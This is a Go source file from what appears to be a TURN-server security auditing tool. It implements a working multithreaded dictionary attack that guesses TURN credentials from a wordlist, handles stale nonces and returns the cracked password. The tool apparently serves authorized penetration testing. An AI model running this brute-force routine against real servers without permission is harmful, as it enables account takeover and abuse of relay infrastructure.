// Copyright 2025 Praetorian Security, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package audit

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/pion/stun"
	"github.com/praetorian-inc/turnt/internal/turn"
)

// BruteForceConfig configures the dictionary attack.
type BruteForceConfig struct {
	ServerAddr string
	Protocol   string
	Username   string
	Wordlist   string // path to password file
	Threads    int
	Delay      time.Duration
}

// BruteForceResult contains the outcome of a brute-force attack.
type BruteForceResult struct {
	Found    bool
	Password string
	Attempts uint64
	Duration time.Duration
}

// BruteForce performs a dictionary attack against TURN credentials.
func BruteForce(ctx context.Context, cfg BruteForceConfig) (*BruteForceResult, error) {
	if cfg.Threads <= 0 {
		cfg.Threads = 10
	}

	// Open wordlist
	f, err := os.Open(cfg.Wordlist)
	if err != nil {
		return nil, fmt.Errorf("open wordlist: %w", err)
	}
	defer f.Close()

	// Learn realm and nonce from the server
	initClient, err := turn.NewClient(turn.ClientConfig{
		ServerAddr: cfg.ServerAddr,
		Protocol:   cfg.Protocol,
		Username:   cfg.Username,
		Password:   "probe", // dummy password to learn realm
	})
	if err != nil {
		return nil, fmt.Errorf("connect for auth params: %w", err)
	}

	err = initClient.LearnAuthParams()
	initClient.Close()
	if err != nil {
		return nil, fmt.Errorf("learn auth params: %w", err)
	}

	realm := initClient.GetRealm()
	nonce := initClient.GetNonce()

	result := &BruteForceResult{}
	startTime := time.Now()

	// Password distribution channel
	passwords := make(chan string, cfg.Threads*2)
	ctx, cancel := context.WithCancel(ctx)
	defer cancel()

	var attempts atomic.Uint64
	var found atomic.Bool
	var foundPassword string
	var foundMu sync.Mutex

	// Feed passwords from wordlist
	go func() {
		defer close(passwords)
		scanner := bufio.NewScanner(f)
		for scanner.Scan() {
			password := strings.TrimSpace(scanner.Text())
			if password == "" {
				continue
			}
			select {
			case passwords <- password:
			case <-ctx.Done():
				return
			}
		}
	}()

	// Worker pool
	var wg sync.WaitGroup
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			client, err := turn.NewClient(turn.ClientConfig{
				ServerAddr: cfg.ServerAddr,
				Protocol:   cfg.Protocol,
				Username:   cfg.Username,
				Password:   "placeholder",
			})
			if err != nil {
				return
			}
			defer client.Close()

			// Set the realm and nonce learned earlier
			client.SetRealm(realm)
			client.UpdateNonce(nonce)

			for password := range passwords {
				if found.Load() {
					return
				}

				select {
				case <-ctx.Done():
					return
				default:
				}

				attempts.Add(1)

				// Compute key and set credentials
				client.SetCredentials(cfg.Username, password)

				resp, err := client.SendAuthenticatedAllocate()
				if err != nil {
					// Network error, continue trying
					continue
				}

				if resp.Type.Class == stun.ClassSuccessResponse {
					found.Store(true)
					foundMu.Lock()
					foundPassword = password
					foundMu.Unlock()
					cancel()
					// Deallocate
					client.SendRefresh(0)
					return
				}

				if resp.Type.Class == stun.ClassErrorResponse {
					code, _, _ := turn.ParseErrorCode(resp)
					if code == 438 {
						// Stale nonce, update from response
						newNonce := turn.ParseNonce(resp)
						if newNonce != "" {
							client.UpdateNonce(newNonce)
						}
					}
				}

				if cfg.Delay > 0 {
					time.Sleep(cfg.Delay)
				}
			}
		}()
	}

	wg.Wait()

	result.Duration = time.Since(startTime)
	result.Attempts = attempts.Load()
	result.Found = found.Load()
	if result.Found {
		result.Password = foundPassword
	}

	return result, nil
}
